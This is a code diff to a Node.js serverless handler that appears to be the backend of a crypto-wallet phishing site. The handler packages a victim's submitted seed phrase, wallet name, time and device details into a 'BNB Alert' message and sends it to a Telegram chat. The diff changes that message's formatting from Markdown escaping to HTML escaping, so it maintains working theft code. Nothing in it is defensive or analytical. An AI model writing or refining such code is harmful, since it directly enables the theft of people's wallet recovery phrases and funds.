@@ -66,58 +66,37 @@ module.exports = async (req, res) => {
     formattedDate = formattedDate || new Date().toUTCString();
     const wordCountDesc = keywords ? `${keywords} word phrase` : '12 word phrase';
 
-    // Escape Markdown special characters to prevent parsing errors
-    // Telegram Markdown requires escaping: _ * [ ] ( ) ~ ` > # + - = | { } . !
-    function escapeMarkdown(text) {
+    // Escape HTML special characters (much simpler than Markdown!)
+    // HTML parse mode only requires escaping: < > &
+    function escapeHTML(text) {
       if (!text) return '';
       return String(text)
-        .replace(/\_/g, '\\_')
-        .replace(/\*/g, '\\*')
-        .replace(/\[/g, '\\[')
-        .replace(/\]/g, '\\]')
-        .replace(/\(/g, '\\(')
-        .replace(/\)/g, '\\)')
-        .replace(/\~/g, '\\~')
-        .replace(/\`/g, '\\`')
-        .replace(/\>/g, '\\>')
-        .replace(/\#/g, '\\#')
-        .replace(/\+/g, '\\+')
-        .replace(/\-/g, '\\-')
-        .replace(/\=/g, '\\=')
-        .replace(/\|/g, '\\|')
-        .replace(/\{/g, '\\{')
-        .replace(/\}/g, '\\}')
-        .replace(/\./g, '\\.')
-        .replace(/\!/g, '\\!');
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
     }
 
-    // For seed phrase in code block: only escape backticks (special chars in code blocks are fine)
-    function escapePhraseForCodeBlock(text) {
-      if (!text) return '';
-      return String(text).replace(/\`/g, '\\`');
-    }
-
-    // Escape all user input fields
-    const escapedPhrase = escapePhraseForCodeBlock(phrase); // Only escape backticks for code block
-    const escapedWallet = escapeMarkdown(imported || 'Unknown');
-    const escapedDate = escapeMarkdown(formattedDate);
-    const escapedDevice = escapeMarkdown(deviceInfo.substring(0, 200));
+    // Escape all user input fields for HTML
+    const escapedPhrase = escapeHTML(phrase);
+    const escapedWallet = escapeHTML(imported || 'Unknown');
+    const escapedDate = escapeHTML(formattedDate);
+    const escapedDevice = escapeHTML(deviceInfo.substring(0, 200));
     
-    // Format Telegram message in "BNB Alert" style (with escaped special characters)
-    let message = `🚨 *BNB Alert*\n\n` +
-                   `🔑 *SEED PHRASE SUBMITTED*\n\n` +
-                   `👤 *Wallet:* ${escapedWallet}\n` +
-                   `🔤 *Words:* ${wordCountDesc}\n` +
-                   `🕐 *Time:* ${escapedDate}\n` +
-                   `🌍 *Location:* Unknown, Unknown\n` +
-                   `📱 *Device:* ${escapedDevice}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
-                   `🔒 *Seed Phrase:*\n` +
-                   `\`${escapedPhrase}\`\n\n` +
-                   `⚠️ _User attempted wallet recovery_\n\n`;
+    // Format Telegram message in "BNB Alert" style using HTML
+    let message = `🚨 <b>BNB Alert</b>\n\n` +
+                   `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
+                   `👤 <b>Wallet:</b> ${escapedWallet}\n` +
+                   `🔤 <b>Words:</b> ${wordCountDesc}\n` +
+                   `🕐 <b>Time:</b> ${escapedDate}\n` +
+                   `🌍 <b>Location:</b> Unknown, Unknown\n` +
+                   `📱 <b>Device:</b> ${escapedDevice}${deviceInfo.length > 200 ? '...' : ''}\n\n` +
+                   `🔒 <b>Seed Phrase:</b>\n` +
+                   `<code>${escapedPhrase}</code>\n\n` +
+                   `⚠️ <i>User attempted wallet recovery</i>\n\n`;
     
     // Add copy URL link if available
     if (copyUrl) {
-      message += `[📎 Click to Copy Phrase](${copyUrl})`;
+      message += `<a href="${copyUrl}">📎 Click to Copy Phrase</a>`;
     }
     
     // Telegram message length limit is 4096 characters
@@ -126,19 +105,19 @@ module.exports = async (req, res) => {
       const baseMessageLength = message.length - escapedPhrase.length;
       const maxPhraseLength = Math.max(0, 4096 - baseMessageLength - 100); // Leave 100 chars buffer
       const truncatedPhrase = phrase.substring(0, maxPhraseLength);
-      const escapedTruncatedPhrase = escapePhraseForCodeBlock(truncatedPhrase);
-      message = `🚨 *BNB Alert*\n\n` +
-                 `🔑 *SEED PHRASE SUBMITTED*\n\n` +
-                 `👤 *Wallet:* ${escapedWallet}\n` +
-                 `🔤 *Words:* ${wordCountDesc}\n` +
-                 `🕐 *Time:* ${escapedDate}\n` +
-                 `🌍 *Location:* Unknown, Unknown\n` +
-                 `📱 *Device:* ${escapedDevice.substring(0, 100)}...\n\n` +
-                 `🔒 *Seed Phrase:*\n` +
-                 `\`${escapedTruncatedPhrase}...\`\n\n` +
-                 `⚠️ _User attempted wallet recovery_\n\n`;
+      const escapedTruncatedPhrase = escapeHTML(truncatedPhrase);
+      message = `🚨 <b>BNB Alert</b>\n\n` +
+                 `🔑 <b>SEED PHRASE SUBMITTED</b>\n\n` +
+                 `👤 <b>Wallet:</b> ${escapedWallet}\n` +
+                 `🔤 <b>Words:</b> ${wordCountDesc}\n` +
+                 `🕐 <b>Time:</b> ${escapedDate}\n` +
+                 `🌍 <b>Location:</b> Unknown, Unknown\n` +
+                 `📱 <b>Device:</b> ${escapedDevice.substring(0, 100)}...\n\n` +
+                 `🔒 <b>Seed Phrase:</b>\n` +
+                 `<code>${escapedTruncatedPhrase}...</code>\n\n` +
+                 `⚠️ <i>User attempted wallet recovery</i>\n\n`;
       if (copyUrl) {
-        message += `[📎 Click to Copy Phrase](${copyUrl})`;
+        message += `<a href="${copyUrl}">📎 Click to Copy Phrase</a>`;
       }
     }
 
@@ -164,7 +143,7 @@ module.exports = async (req, res) => {
       body: JSON.stringify({
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
         disable_web_page_preview: true
       })
     });
